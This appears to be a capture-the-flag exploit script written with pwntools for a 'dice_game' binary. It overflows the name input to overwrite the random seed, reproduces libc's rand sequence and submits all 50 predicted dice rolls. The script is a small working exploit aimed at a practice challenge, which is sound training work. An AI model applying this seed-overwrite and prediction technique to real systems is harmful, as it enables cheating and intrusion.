from pwn import *
from ctypes import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
breakrva 0xbf7
breakrva 0xc44
continue
'''.format(**locals())

#Binary filename
exe = './dice_game_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()
libc = cdll.LoadLibrary("./libc.so.6")
libc.srand(0x6b6b6b6b6b6b6b6b)

p.sendlineafter(b"let me know your name: ", "kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk")
rand_list = []
for i in range(50):
    rand_list.append(libc.rand()%6 + 1)
print(rand_list)

for i in range(50):
    p.sendlineafter(b"Give me the point(1~6): ", str(rand_list[i]))

p.interactive()        


